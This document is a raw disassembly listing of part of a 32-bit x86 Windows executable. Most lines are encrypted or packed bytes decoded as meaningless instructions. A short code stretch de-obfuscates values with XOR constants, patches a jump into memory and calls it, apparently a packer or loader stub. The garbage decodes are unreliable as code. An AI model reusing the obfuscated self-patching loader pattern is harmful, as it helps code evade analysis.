  42f5f7:	mov    cl,0xd9
  42f5f9:	in     eax,0xf4
  42f5fb:	cmc    
  42f5fc:	retf   
  42f5fd:	hlt    
  42f5fe:	cli    
  42f5ff:	cli    
  42f600:	mov    esi,0xe2c006f7
  42f605:	(bad)
  42f608:	(bad)  
  42f609:	sti    
  42f60a:	lds    ecx,FWORD PTR [edx]
  42f60c:	add    eax,0xf7edcec1
  42f611:	(bad)
  42f614:	sar    bl,cl
  42f616:	in     al,dx
  42f617:	shl    edi,0xd4
  42f61a:	mov    edx,0xdccddaff
  42f61f:	fnstcw WORD PTR [esi-0xe281243]
  42f625:	fcmovb st,st(0)
  42f627:	loopne 0x42f5f0
  42f629:	por    mm7,mm4
  42f62c:	or     esp,esp
  42f62e:	in     al,0xd0
  42f630:	rcr    esi,0xbc
  42f633:	mov    bl,0xcf
  42f635:	mul    ebp
  42f637:	mov    bh,0xd8
  42f639:	(bad)  
  42f63b:	mov    edx,0xf9d5b1f7
  42f640:	ret    
  42f641:	xlat   BYTE PTR ds:[ebx]
  42f642:	push   esi
  42f644:	add    al,0x1
  42f646:	ret    0xe7f6
  42f649:	push   cs
  42f64a:	cmc    
  42f64b:	out    0xe3,al
  42f64d:	enter  0xe2da,0xb0
  42f651:	fbstp  TBYTE PTR [esi-0x3b2b5333]
  42f657:	jmp    0xcb19c924
  42f65c:	mov    eax,0xfbdcbbeb
  42f661:	div    bh
  42f663:	add    bh,bl
  42f665:	add    BYTE PTR [edx+edi*8],al
  42f668:	enter  0xff03,0xee
  42f66c:	int3   
  42f66d:	call   0xca0cd73b
  42f672:	leave  
  42f673:	ret    0xfab7
  42f676:	out    dx,al
  42f677:	mov    ah,0xca
  42f679:	rcr    eax,1
  42f67b:	cli    
  42f67c:	repnz aam 0xfb
  42f67f:	(bad)  
  42f680:	rcr    ecx,cl
  42f682:	rol    BYTE PTR ds:0xdcd4c5ba,cl
  42f688:	shl    esp,0xdf
  42f68b:	in     al,dx
  42f68c:	add    eax,0xeeb801d8
  42f691:	test   al,0xe6
  42f693:	ror    ch,0xd6
  42f696:	cli    
  42f697:	retf   0xc4ff
  42f69a:	mov    bh,0xea
  42f69c:	int    0xef
  42f69e:	into   
  42f69f:	(bad)  
  42f6a1:	std    
  42f6a2:	pop    es
  42f6a3:	xlat   BYTE PTR ds:[ebx]
  42f6a4:	push   es
  42f6a5:	xlat   BYTE PTR ds:[ebx]
  42f6a6:	or     esi,edi
  42f6a8:	or     bh,cl
  42f6aa:	add    al,0xfc
  42f6ac:	out    dx,eax
  42f6ad:	pop    es
  42f6ae:	out    0xca,al
  42f6b0:	jecxz  0x42f684
  42f6b2:	test   al,0xe5
  42f6b4:	out    0xc1,al
  42f6b6:	(bad)
  42f6b9:	out    0xb7,al
  42f6bb:	aad    0xcf
  42f6bd:	sar    DWORD PTR [esi-0x3c210520],1
  42f6c3:	cli    
  42f6c4:	add    al,al
  42f6c6:	loopne 0x42f6cf
  42f6c8:	xlat   BYTE PTR ds:[ebx]
  42f6c9:	iret   
  42f6ca:	dec    BYTE PTR [ebx]
  42f6cc:	jmp    0x42f6cd
  42f6ce:	enter  0xacb2,0xd0
  42f6d2:	mov    dl,0xbc
  42f6d4:	repz in al,0xc6
  42f6d7:	leave  
  42f6d8:	in     al,0xf5
  42f6da:	retf   0xe4f8
  42f6dd:	sar    edi,cl
  42f6df:	add    dl,al
  42f6e1:	iret   
  42f6e2:	out    dx,al
  42f6e3:	add    ebx,ebx
  42f6e5:	idiv   BYTE PTR [ebp+eax*8-0x12372108]
  42f6ec:	loope  0x42f6fa
  42f6ee:	stc    
  42f6ef:	lods   al,BYTE PTR ds:[esi]
  42f6f0:	(bad)
  42f6f3:	int    0xed
  42f6f5:	iret   
  42f6f6:	mov    edx,0xfaf4c4fb
  42f6fb:	in     al,dx
  42f6fc:	rcr    bl,cl
  42f6fe:	loope  0x42f6fc
  42f700:	add    cl,dh
  42f702:	clc    
  42f703:	mov    ebx,0xff0afffb
  42f708:	add    ebx,esp
  42f70a:	cli    
  42f70b:	int    0x6
  42f70d:	add    ch,ah
  42f70f:	out    dx,eax
  42f710:	lods   eax,DWORD PTR ds:[esi]
  42f711:	scas   al,BYTE PTR es:[edi]
  42f712:	in     eax,dx
  42f713:	in     al,dx
  42f714:	(bad)  
  42f715:	hlt    
  42f716:	repnz iret 
  42f718:	repz into 
  42f71a:	aam    0xca
  42f71c:	mov    ah,0xff
  42f71e:	shl    bl,cl
  42f720:	loope  0x42f728
  42f722:	sar    DWORD PTR [edi-0x3d232323],0xde
  42f729:	(bad)  
  42f72a:	aad    0xcd
  42f72c:	push   es
  42f72d:	add    ebx,esp
  42f72f:	into   
  42f730:	ret    
  42f731:	in     eax,0xca
  42f733:	rol    ah,0xfb
  42f736:	xlat   BYTE PTR ds:[ebx]
  42f737:	in     al,dx
  42f738:	cmc    
  42f739:	lock (bad) 
  42f73b:	in     eax,dx
  42f73c:	aad    0xb8
  42f73e:	out    dx,eax
  42f73f:	rol    al,1
  42f741:	sti    
  42f742:	in     al,dx
  42f743:	(bad)  
  42f744:	(bad)  
  42f745:	add    ch,bl
  42f747:	(bad)
  42f74a:	add    al,0xfc
  42f74c:	add    dh,cl
  42f74e:	rol    bl,cl
  42f750:	(bad)  
  42f751:	out    0xb2,eax
  42f753:	jmp    0xc128e702
  42f758:	mov    edx,0xe8cde5b9
  42f75d:	loop   0x42f73d
  42f75f:	call   0xf93cff62
  42f764:	loop   0x42f73b
  42f766:	loope  0x42f745
  42f768:	mov    esi,0x7fbe904
  42f76d:	or     edx,ebx
  42f76f:	into   
  42f770:	(bad)  
  42f771:	out    0xac,eax
  42f773:	ret    0xb1cf
  42f776:	(bad)  
  42f777:	in     eax,dx
  42f778:	mov    bh,0xed
  42f77a:	icebp  
  42f77b:	fnstenv [edx-0xd023237]
  42f781:	add    bh,bl
  42f783:	int3   
  42f784:	pop    es
  42f785:	(bad)  
  42f786:	xlat   BYTE PTR ds:[ebx]
  42f787:	fmul   DWORD PTR [ecx]
  42f789:	loope  0x42f74f
  42f78b:	leave  
  42f78c:	fptan  
  42f78e:	in     al,dx
  42f78f:	retf   
  42f790:	stos   BYTE PTR es:[edi],al
  42f791:	xlat   BYTE PTR ds:[ebx]
  42f792:	faddp  st(0),st
  42f794:	shl    DWORD PTR [edx-0x4410160e],cl
  42f79a:	mov    ah,0xb5
  42f79c:	mov    ebp,0xcebbf2bb
  42f7a1:	cmc    
  42f7a2:	cli    
  42f7a3:	icebp  
  42f7a4:	not    ebp
  42f7a6:	add    eax,ebx
  42f7a8:	stc    
  42f7a9:	iret   
  42f7aa:	add    al,cl
  42f7ac:	retf   
  42f7ad:	add    eax,0xc0d3c706
  42f7b2:	aad    0xd1
  42f7b4:	fmul   st(5),st
  42f7b6:	mov    bh,0xb0
  42f7b8:	call   0xef39de93
  42f7bd:	idiv   DWORD PTR [ebx-0x473e0e27]
  42f7c3:	rcr    ecx,cl
  42f7c5:	or     ah,al
  42f7c7:	ret    0xeae5
  42f7ca:	call   0xea0407ac
  42f7cf:	ret    0xdca9
  42f7d2:	jmp    0x42f7a2
  42f7d4:	scas   al,BYTE PTR es:[edi]
  42f7d5:	call   0xf91db2d5
  42f7da:	hlt    
  42f7db:	mov    dh,0xc8
  42f7dd:	xlat   BYTE PTR ds:[ebx]
  42f7de:	mov    edi,0xd1bee1e1
  42f7e3:	pop    es
  42f7e4:	idiv   DWORD PTR [esp+esi*8-0x1c161df9]
  42f7eb:	clc    
  42f7ec:	loop   0x42f7dd
  42f7ee:	fsubr  st(1),st
  42f7f0:	shr    cl,1
  42f7f2:	ret    0xcbaf
  42f7f5:	cli    
  42f7f6:	out    dx,al
  42f7f7:	not    ecx
  42f7f9:	mov    edx,0xbef7f1e4
  42f7fe:	mov    ecx,0xf3f2e1fe
  42f803:	push   es
  42f804:	ret    
  42f805:	jmp    0x42f7f9
  42f807:	ret    0xd807
  42f80a:	in     eax,0xde
  42f80c:	jecxz  0x42f81c
  42f80e:	out    dx,al
  42f80f:	loop   0x42f7d9
  42f811:	xlat   BYTE PTR ds:[ebx]
  42f812:	mov    bh,0xb1
  42f814:	ror    cl,1
  42f816:	in     eax,0xe9
  42f818:	iret   
  42f819:	jmp    0xd438afea
  42f81e:	add    edi,DWORD PTR [edi+0x7c1d6cc]
  42f824:	add    ecx,ebx
  42f826:	(bad)  
  42f828:	or     al,BYTE PTR [eax]
  42f82a:	add    al,0xea
  42f82c:	in     eax,0xf8
  42f82e:	fisubr DWORD PTR [eax+eiz*8-0x36232914]
  42f835:	icebp  
  42f836:	mov    ebx,0xfed3b7f3
  42f83b:	fdivr  DWORD PTR [ebx-0xf103d06]
  42f841:	iret   
  42f842:	in     eax,dx
  42f843:	fdivrp st(3),st
  42f845:	hlt    
  42f846:	(bad)  
  42f847:	out    0xe4,eax
  42f849:	jmp    0xa41d52f
  42f84e:	loopne 0x42f843
  42f850:	xlat   BYTE PTR ds:[ebx]
  42f851:	fucom  st(2)
  42f853:	hlt    
  42f854:	call   0xd428ad2d
  42f859:	out    dx,al
  42f85a:	mov    eax,0xeff8dfd8
  42f85f:	xlat   BYTE PTR ds:[ebx]
  42f860:	test   esp,0xc1f4cce0
  42f866:	test   BYTE PTR ds:0xdee6bdc6,0xdc
  42f86d:	retf   
  42f86e:	(bad)  
  42f870:	jmp    0xcd27d53d
  42f875:	lock shl cl,1
  42f878:	scas   al,BYTE PTR es:[edi]
  42f879:	lock hlt 
  42f87b:	into   
  42f87c:	in     al,dx
  42f87d:	cld    
  42f87e:	neg    esi
  42f880:	mov    dh,0xb9
  42f882:	stc    
  42f883:	add    eax,0xdbe7f9f4
  42f888:	clc    
  42f889:	test   bl,0xfc
  42f88c:	in     eax,0xe4
  42f88e:	adc    ebx,eax
  42f890:	ret    0xcef6
  42f893:	test   eax,0xf8d4f3f7
  42f899:	xlat   BYTE PTR ds:[ebx]
  42f89a:	test   ah,0xf1
  42f89d:	mov    edx,0xc1bcd3e3
  42f8a2:	out    dx,al
  42f8a3:	cmc    
  42f8a4:	cmc    
  42f8a5:	add    cl,BYTE PTR [ecx]
  42f8a7:	(bad)  
  42f8a8:	mov    esi,0xcdddbc0a
  42f8ad:	out    0xea,al
  42f8af:	faddp  st(0),st
  42f8b1:	mov    edi,0xb0cfdcca
  42f8b6:	loop   0x42f88c
  42f8b8:	int3   
  42f8b9:	int3   
  42f8ba:	out    dx,al
  42f8bb:	div    BYTE PTR [edx-0x47ff2635]
  42f8c1:	in     al,dx
  42f8c2:	out    0xfc,al
  42f8c4:	clc    
  42f8c5:	push   es
  42f8c6:	rcr    ebx,0x7
  42f8c9:	add    eax,0xe2e9c5ca
  42f8ce:	in     al,0xb2
  42f8d0:	out    dx,al
  42f8d1:	int    0xa4
  42f8d3:	lods   al,BYTE PTR ds:[esi]
  42f8d4:	repz out dx,eax
  42f8d6:	mov    dl,0xd5
  42f8d8:	idiv   DWORD PTR [ecx-0x47072909]
  42f8de:	ret    0xf3
  42f8e1:	loope  0x42f8aa
  42f8e3:	add    al,0xf9
  42f8e5:	or     ah,ah
  42f8e7:	retf   0x7ca
  42f8ea:	hlt    
  42f8eb:	out    0xf9,al
  42f8ed:	add    ebp,ebx
  42f8ef:	shl    cl,cl
  42f8f1:	lock mov ebp,0xfbacf3c2
  42f8f7:	(bad)  
  42f8f8:	int    0xc4
  42f8fa:	mov    ch,0xfe
  42f8fc:	xlat   BYTE PTR ds:[ebx]
  42f8fd:	aad    0xfe
  42f8ff:	(bad)  
  42f901:	fnstsw WORD PTR [esi+esi*8-0x22012305]
  42f908:	push   es
  42f909:	retf   0xdff9
  42f90c:	fmul   st(7),st
  42f90e:	retf   
  42f90f:	jmp    0xf5e2:0xefe9e4df
  42f916:	shl    ch,cl
  42f918:	jmp    0x42f914
  42f91a:	shl    DWORD PTR [esi-0x124410f],1
  42f920:	sti    
  42f921:	in     al,dx
  42f922:	cli    
  42f923:	mov    esi,0xfef1ded2
  42f928:	(bad)  
  42f92a:	rol    BYTE PTR [ecx],0x0
  42f92d:	push   es
  42f92e:	jecxz  0x42f91b
  42f930:	mov    bl,0xe9
  42f932:	shl    BYTE PTR [esi-0x29120909],0xcc
  42f939:	fcmovnu st,st(6)
  42f93b:	clc    
  42f93c:	fdivp  st(7),st
  42f93e:	mov    ecx,0xb8c3d1b8
  42f943:	repz xlat BYTE PTR ds:[ebx]
  42f945:	fcmovnb st,st(1)
  42f947:	in     al,0x6
  42f949:	add    bh,dh
  42f94b:	jmp    0xeebf:0xf1c4e9c2
  42f952:	jecxz  0x42f94b
  42f954:	in     al,0xcc
  42f956:	leave  
  42f957:	leave  
  42f958:	icebp  
  42f959:	jmp    0xed16c71d
  42f95e:	mov    esp,0xe7fce2ce
  42f963:	in     eax,0xdc
  42f965:	cmc    
  42f966:	jecxz  0x42f95d
  42f968:	(bad)  
  42f96b:	push   es
  42f96c:	retf   
  42f96d:	std    
  42f96e:	cli    
  42f96f:	into   
  42f970:	(bad)  
  42f972:	in     eax,dx
  42f973:	in     al,dx
  42f974:	mov    esp,0xceb4c2d5
  42f979:	mov    eax,0xe3d5f7d4
  42f97e:	(bad)  
  42f97f:	(bad)  
  42f980:	fild   DWORD PTR [edi]
  42f982:	cmc    
  42f983:	sar    DWORD PTR [esp+eax*8-0x28f71510],0xc9
  42f98b:	cld    
  42f98c:	adc    eax,DWORD PTR ds:0xc0aec3c8
  42f992:	(bad)  
  42f993:	jmp    0x42f95b
  42f995:	loope  0x42f983
  42f997:	in     al,dx
  42f998:	icebp  
  42f999:	icebp  
  42f99a:	xlat   BYTE PTR ds:[ebx]
  42f99b:	les    esi,FWORD PTR [ebp-0x21321505]
  42f9a1:	mov    ch,0xce
  42f9a3:	in     al,0x1
  42f9a5:	loope  0x42f99e
  42f9a7:	in     al,0x2
  42f9a9:	test   ch,0xfd
  42f9ac:	out    dx,eax
  42f9ad:	adc    cl,ch
  42f9af:	int    0xd8
  42f9b1:	lods   al,BYTE PTR ds:[esi]
  42f9b2:	lods   eax,DWORD PTR ds:[esi]
  42f9b3:	rcl    ecx,0xc9
  42f9b6:	cli    
  42f9b7:	repz loopne 0x42f9b5
  42f9ba:	clc    
  42f9bb:	mov    edi,0xf0f8cfe9
  42f9c0:	shl    DWORD PTR [ebp+0x3bdc0dc],1
  42f9c6:	fcos   
  42f9c8:	in     al,0x0
  42f9ca:	fmulp  st(1),st
  42f9cc:	loop   0x42f9c8
  42f9ce:	add    ebp,edx
  42f9d0:	mov    ebp,0xfbe1cbc5
  42f9d5:	jmp    0xfefd:0xe7f9e9c8
  42f9dc:	fild   DWORD PTR [ebx]
  42f9de:	mov    edx,0xf2dbd6e2
  42f9e3:	cmc    
  42f9e4:	les    eax,FWORD PTR [esi]
  42f9e6:	(bad)  
  42f9e7:	jecxz  0x42f9cf
  42f9e9:	add    eax,0xccdfd90b
  42f9ee:	stc    
  42f9ef:	stos   BYTE PTR es:[edi],al
  42f9f0:	mov    cl,0xce
  42f9f2:	loope  0x42f9e2
  42f9f4:	shl    DWORD PTR [esp+ebp*8-0x220a312c],cl
  42f9fb:	mov    ch,0xf1
  42f9fd:	fidivr DWORD PTR [eax-0x1c252f28]
  42fa03:	(bad)  
  42fa05:	add    eax,0x8c1ea06
  42fa0a:	(bad)  
  42fa0b:	or     ah,ch
  42fa0d:	(bad)  
  42fa0e:	jmp    0xf40ea2f8
  42fa13:	fsubr  st(3),st
  42fa15:	rcl    dl,0xee
  42fa18:	out    0xf1,al
  42fa1a:	lods   al,BYTE PTR ds:[esi]
  42fa1b:	xlat   BYTE PTR ds:[ebx]
  42fa1c:	cli    
  42fa1d:	retf   
  42fa1e:	(bad)  
  42fa20:	loopne 0x42fa03
  42fa22:	mov    ah,0xf5
  42fa24:	(bad)  
  42fa25:	xlat   BYTE PTR ds:[ebx]
  42fa26:	jmp    0xe445bb28
  42fa2b:	aad    0xfc
  42fa2d:	int    0xef
  42fa2f:	in     eax,0xc0
  42fa31:	mov    esp,0xc5cdccaf
  42fa36:	lods   al,BYTE PTR ds:[esi]
  42fa37:	fnstcw WORD PTR [ebx-0x42e1726]
  42fa3d:	fidivr DWORD PTR [ebx-0x2d03330c]
  42fa43:	(bad)  
  42fa44:	fnop   
  42fa46:	push   es
  42fa47:	ret    0xe9f9
  42fa4a:	add    eax,0xe2edddc5
  42fa4f:	iret   
  42fa50:	enter  0xe1e2,0xb2
  42fa54:	retf   0xd0fb
  42fa57:	aam    0xce
  42fa59:	repnz mov bh,0xf2
  42fa5c:	add    edi,DWORD PTR [edi-0x250404fe]
  42fa62:	(bad)  
  42fa63:	aad    0xd6
  42fa65:	clc    
  42fa66:	sti    
  42fa67:	(bad)  
  42fa68:	(bad)  
  42fa6a:	retf   
  42fa6b:	int    0xf
  42fa6d:	repnz adc DWORD PTR [edi-0x131a284e],edi
  42fa74:	idiv   edx
  42fa76:	ror    bl,0xf7
  42fa79:	repz xlat BYTE PTR ds:[ebx]
  42fa7b:	iret   
  42fa7c:	xlat   BYTE PTR ds:[ebx]
  42fa7d:	jmp    0x42fa68
  42fa7f:	rol    DWORD PTR [edi],0xb5
  42fa82:	rcr    ah,cl
  42fa84:	(bad)  
  42fa85:	neg    ah
  42fa87:	pop    es
  42fa88:	hlt    
  42fa89:	add    ch,dh
  42fa8b:	fsubr  st,st(1)
  42fa8d:	or     ebp,ecx
  42fa8f:	fidivr WORD PTR [esi-0xc3a1919]
  42fa95:	out    0xf3,al
  42fa97:	jmp    0x42fa4f
  42fa99:	fsubp  st(1),st
  42fa9b:	cmc    
  42fa9c:	(bad)  
  42fa9d:	fucomp st(5)
  42fa9f:	ret    0xb5f7
  42faa2:	std    
  42faa3:	xlat   BYTE PTR ds:[ebx]
  42faa4:	ret    0x3da
  42faa7:	add    eax,0xecc90bd6
  42faac:	cli    
  42faad:	stc    
  42faae:	jmp    0xf811d379
  42fab3:	mov    bl,0xf6
  42fab5:	test   eax,0xe9e4afe9
  42faba:	fcmovnbe st,st(7)
  42fabc:	cmc    
  42fabd:	out    dx,al
  42fabe:	mov    esi,0xe1dcc3ef
  42fac3:	add    BYTE PTR [edi],al
  42fac5:	loope  0x42faa8
  42fac7:	aad    0xc8
  42fac9:	(bad)
  42facc:	fdivr  st,st(7)
  42face:	retf   
  42facf:	in     eax,dx
  42fad0:	rcr    esi,0xe5
  42fad3:	jmp    0x42fad0
  42fad5:	sar    cl,cl
  42fad7:	mov    ah,0xce
  42fad9:	sti    
  42fada:	mov    ebx,0xf1ceb9d0
  42fadf:	(bad)  
  42fae0:	in     eax,dx
  42fae1:	repnz (bad) 
  42fae3:	loop   0x42fab5
  42fae5:	add    bh,bh
  42fae7:	dec    DWORD PTR [ebx]
  42fae9:	xlat   BYTE PTR ds:[ebx]
  42faea:	fcomp  st(6)
  42faec:	(bad)  
  42faed:	sti    
  42faee:	or     al,0xa7
  42faf0:	lods   al,BYTE PTR ds:[esi]
  42faf1:	test   eax,0xf6e1abc5
  42faf6:	test   ch,0xb1
  42faf9:	sar    al,1
  42fafb:	fdiv   st,st(3)
  42fafd:	sar    DWORD PTR [esi-0x2d0f373f],cl
  42fb03:	add    esp,edx
  42fb05:	jmp    0x42faea
  42fb07:	ror    eax,0xf7
  42fb0a:	add    ebp,esi
  42fb0c:	or     al,0xc5
  42fb0e:	add    ch,BYTE PTR [edi-0x4a121410]
  42fb14:	enter  0xb7bb,0xc0
  42fb18:	fcmovnbe st,st(7)
  42fb1a:	fcomip st,st(2)
  42fb1c:	idiv   DWORD PTR [ebx-0x21303234]
  42fb22:	loop   0x42fb07
  42fb24:	lock (bad) 
  42fb26:	mov    esp,0xe9dade0a
  42fb2b:	or     DWORD PTR [edx],eax
  42fb2d:	adc    edx,ebx
  42fb2f:	retf   0xecd0
  42fb32:	call   0xb11dc70b
  42fb37:	clc    
  42fb38:	in     eax,dx
  42fb39:	int    0xea
  42fb3b:	aad    0xf0
  42fb3d:	(bad)  
  42fb3f:	loope  0x42fafb
  42fb41:	fadd   st,st(0)
  42fb43:	mov    esi,0xc7e9d2eb
  42fb48:	aam    0xf9
  42fb4a:	loope  0x42fb2b
  42fb4c:	or     ebx,ebp
  42fb4e:	shr    ch,cl
  42fb50:	ffree  st(6)
  42fb52:	(bad)  
  42fb53:	repnz out 0xd0,eax
  42fb56:	int3   
  42fb57:	rol    ah,cl
  42fb59:	in     al,dx
  42fb5a:	mov    ch,0xf6
  42fb5c:	repnz clc 
  42fb5e:	int3   
  42fb5f:	in     al,dx
  42fb60:	out    dx,eax
  42fb61:	(bad)  
  42fb63:	(bad)  
  42fb64:	add    al,0xbc
  42fb66:	push   es
  42fb67:	aad    0xdc
  42fb69:	rol    DWORD PTR [edi+ecx*8],0xe
  42fb6d:	add    al,0xca
  42fb6f:	mov    ebp,0xc1b0d3e8
  42fb74:	mov    bl,0xf1
  42fb76:	shl    dl,0xf2
  42fb79:	fxtract 
  42fb7b:	in     al,0xc4
  42fb7d:	int3   
  42fb7e:	ror    ecx,1
  42fb80:	sar    bh,1
  42fb82:	out    dx,al
  42fb83:	in     eax,dx
  42fb84:	push   es
  42fb85:	or     esp,esi
  42fb87:	ror    dl,1
  42fb89:	mov    ebp,0x407f8d5
  42fb8e:	iret   
  42fb8f:	icebp  
  42fb90:	jecxz  0x42fb68
  42fb92:	iret   
  42fb93:	(bad)  
  42fb94:	loopne 0x42fb8d
  42fb96:	not    dl
  42fb98:	mov    eax,0xddd6d4ef
  42fb9d:	jecxz  0x42fb5d
  42fb9f:	iret   
  42fba0:	aam    0xf8
  42fba2:	ret    0xccc5
  42fba5:	add    dh,bh
  42fba7:	(bad)  
  42fba8:	dec    edx
  42fbaa:	mov    dh,0xe3
  42fbad:	(bad)
  42fbb0:	int    0xc1
  42fbb2:	out    0xae,eax
  42fbb4:	mov    dh,0xf1
  42fbb6:	enter  0x4d8b,0xcc
  42fbba:	mov    DWORD PTR [ecx],eax
  42fbbc:	lea    eax,[ebp-0x20]
  42fbbf:	mov    DWORD PTR [ebp-0x1c],eax
  42fbc2:	mov    eax,DWORD PTR [ebp-0x1c]
  42fbc5:	mov    eax,DWORD PTR [eax]
  42fbc7:	mov    ecx,DWORD PTR [ebp-0x20]
  42fbca:	sub    eax,ecx
  42fbcc:	mov    ecx,DWORD PTR [ebp-0x1c]
  42fbcf:	mov    DWORD PTR [ecx],eax
  42fbd1:	mov    eax,DWORD PTR [ebp-0x38]
  42fbd4:	xor    eax,0x75108b5
  42fbd9:	add    eax,0x3272fb
  42fbde:	mov    ecx,DWORD PTR [ebp-0x1c]
  42fbe1:	mov    ecx,DWORD PTR [ecx]
  42fbe3:	or     ecx,eax
  42fbe5:	mov    eax,DWORD PTR [ebp-0x1c]
  42fbe8:	mov    DWORD PTR [eax],ecx
  42fbea:	lea    eax,[ebp-0x30]
  42fbed:	mov    DWORD PTR [ebp-0x94],eax
  42fbf3:	mov    eax,DWORD PTR [ebp-0x94]
  42fbf9:	mov    eax,DWORD PTR [eax]
  42fbfb:	mov    ecx,DWORD PTR [ebp-0x30]
  42fbfe:	sub    eax,ecx
  42fc00:	mov    ecx,DWORD PTR [ebp-0x94]
  42fc06:	mov    DWORD PTR [ecx],eax
  42fc08:	mov    eax,DWORD PTR [ebp-0x94]
  42fc0e:	mov    eax,DWORD PTR [eax]
  42fc10:	or     eax,0xf89c85bf
  42fc15:	mov    ecx,DWORD PTR [ebp-0x94]
  42fc1b:	mov    DWORD PTR [ecx],eax
  42fc1d:	mov    eax,DWORD PTR [ebp-0x10]
  42fc20:	xor    eax,0x75108b5
  42fc25:	add    eax,0x3272fb
  42fc2a:	push   eax
  42fc2b:	mov    eax,DWORD PTR [ebp-0x4]
  42fc2e:	xor    eax,0x75108b5
  42fc33:	add    eax,0x3272fb
  42fc38:	push   eax
  42fc39:	mov    eax,DWORD PTR [ebp-0x30]
  42fc3c:	xor    eax,0x75108b5
  42fc41:	add    eax,0x3272ff
  42fc46:	push   eax
  42fc47:	lea    eax,[ebp-0x88]
  42fc4d:	push   eax
  42fc4e:	push   DWORD PTR [ebp-0x38]
  42fc51:	push   DWORD PTR [ebp-0x90]
  42fc57:	call   0x415490
  42fc5c:	test   eax,eax
  42fc5e:	je     0x42fc98
  42fc64:	lea    eax,[ebp-0x88]
  42fc6a:	push   eax
  42fc6b:	mov    eax,DWORD PTR [ebp-0x90]
  42fc71:	xor    eax,0x75108b5
  42fc76:	add    eax,0x3272fb
  42fc7b:	push   eax
  42fc7c:	mov    eax,DWORD PTR [ebp-0x2c]
  42fc7f:	add    eax,0xaa
  42fc84:	push   eax
  42fc85:	mov    eax,DWORD PTR [ebp-0x2c]
  42fc88:	mov    eax,DWORD PTR [eax+0x198]
  42fc8e:	push   DWORD PTR [eax]
  42fc90:	call   0x40d347
  42fc95:	mov    DWORD PTR [ebp-0xc],eax
  42fc98:	lea    eax,[ebp+0x4]
  42fc9b:	mov    ecx,DWORD PTR ds:0x437497
  42fca1:	mov    DWORD PTR [ecx*4+0x43748f],eax
  42fca8:	mov    eax,ds:0x437497
  42fcad:	inc    eax
  42fcae:	mov    ds:0x437497,eax
  42fcb3:	mov    eax,DWORD PTR [ebp-0xc]
  42fcb6:	sub    eax,0x3272fb
  42fcbb:	xor    eax,0x75108b5
  42fcc0:	cmp    eax,0xf89c85b0
  42fcc5:	jne    0x42fcd5
  42fccb:	jmp    0x42fd86
  42fcd0:	jmp    0x42fd86
  42fcd5:	lea    eax,[ebp-0x9c]
  42fcdb:	mov    DWORD PTR [ebp-0x98],eax
  42fce1:	lea    eax,[ebp-0x98]
  42fce7:	mov    DWORD PTR [ebp-0xa0],eax
  42fced:	mov    eax,DWORD PTR [ebp-0x3c]
  42fcf0:	mov    ecx,DWORD PTR [ebp-0xa0]
  42fcf6:	mov    ecx,DWORD PTR [ecx]
  42fcf8:	mov    DWORD PTR [ecx],eax
  42fcfa:	mov    eax,DWORD PTR [ebp-0xc]
  42fcfd:	mov    ecx,DWORD PTR [ebp-0x98]
  42fd03:	mov    ecx,DWORD PTR [ecx]
  42fd05:	sub    ecx,eax
  42fd07:	mov    eax,DWORD PTR [ebp-0x98]
  42fd0d:	mov    DWORD PTR [eax],ecx
  42fd0f:	mov    eax,DWORD PTR [ebp-0xa0]
  42fd15:	mov    eax,DWORD PTR [eax]
  42fd17:	mov    ecx,DWORD PTR [ebp-0x30]
  42fd1a:	xor    ecx,0x75108b5
  42fd20:	add    ecx,0x3272fb
  42fd26:	mov    eax,DWORD PTR [eax]
  42fd28:	sub    eax,ecx
  42fd2a:	mov    ecx,DWORD PTR [ebp-0xa0]
  42fd30:	mov    ecx,DWORD PTR [ecx]
  42fd32:	mov    DWORD PTR [ecx],eax
  42fd34:	mov    eax,DWORD PTR [ebp-0xc]
  42fd37:	mov    DWORD PTR [eax],0x657664e9
  42fd3d:	mov    DWORD PTR [eax+0x4],0x86787677
  42fd44:	mov    eax,DWORD PTR [ebp-0xa0]
  42fd4a:	mov    eax,DWORD PTR [eax]
  42fd4c:	mov    eax,DWORD PTR [eax]
  42fd4e:	mov    ecx,DWORD PTR [ebp-0xc]
  42fd51:	mov    DWORD PTR [ecx+0x1],eax
  42fd54:	push   DWORD PTR [ebp-0x2c]
  42fd57:	mov    eax,ds:0x437463
  42fd5c:	mov    eax,DWORD PTR [eax]
  42fd5e:	push   DWORD PTR [eax]
  42fd60:	push   DWORD PTR ds:0x43747f
  42fd66:	push   DWORD PTR ds:0x437223
  42fd6c:	push   DWORD PTR ds:0x43745f
  42fd72:	push   DWORD PTR ds:0x437503
  42fd78:	push   DWORD PTR [ebp-0x90]
  42fd7e:	push   DWORD PTR [ebp-0x38]
  42fd81:	mov    eax,DWORD PTR [ebp-0xc]
  42fd84:	call   eax
  42fd86:	leave  
  42fd87:	ret    0x10
	...
  42fd92:	add    BYTE PTR [eax],al
  42fd94:	pop    ds
  42fd95:	or     al,0xaa
  42fd97:	dec    ebp
  42fd98:	add    BYTE PTR [eax],al
  42fd9a:	add    BYTE PTR [eax],al
  42fd9c:	add    al,BYTE PTR [eax]
  42fd9e:	add    BYTE PTR [eax],al
  42fda0:	add    BYTE PTR ss:[eax],al
  42fda3:	add    BYTE PTR [eax-0x4ffffd03],dh
  42fda9:	icebp  
  42fdaa:	add    al,BYTE PTR [eax]
  42fdac:	add    BYTE PTR [eax],al
  42fdae:	add    BYTE PTR [eax],al
  42fdb0:	push   edx
  42fdb1:	push   ebx
  42fdb2:	inc    esp
  42fdb3:	push   ebx
  42fdb4:	mov    ah,0x8c
  42fdb6:	inc    edi
  42fdb7:	cmp    eax,0x4b03b5b7
  42fdbc:	xchg   ebx,eax
  42fdbd:	test   BYTE PTR [ebx+0x4734a9e5],ch
  42fdc3:	sub    al,0x1
  42fdc5:	add    BYTE PTR [eax],al
  42fdc7:	add    BYTE PTR [ebx+0x3a],al
  42fdca:	pop    esp
  42fdcb:	dec    eax
  42fdcc:	gs ins BYTE PTR es:[edi],dx
  42fdce:	ins    BYTE PTR es:[edi],dx
  42fdcf:	outs   dx,DWORD PTR ds:[esi]
  42fdd0:	pop    esp
  42fdd1:	dec    ecx
  42fdd2:	outs   dx,BYTE PTR ds:[esi]
  42fdd3:	jae    0x42fe3a
  42fdd5:	jb     0x42fe4b
  42fdd7:	pop    esp
  42fdd8:	inc    esp
  42fdd9:	popa   
  42fdda:	je     0x42fe3d
  42fddc:	pop    esp
  42fddd:	inc    esi
  42fdde:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2e],0x657865
	...
  42fdf2:	add    BYTE PTR [eax],al
  42fdf4:	pop    ds
  42fdf5:	or     al,0xaa
  42fdf7:	dec    ebp
  42fdf8:	add    BYTE PTR [eax],al
  42fdfa:	add    BYTE PTR [eax],al
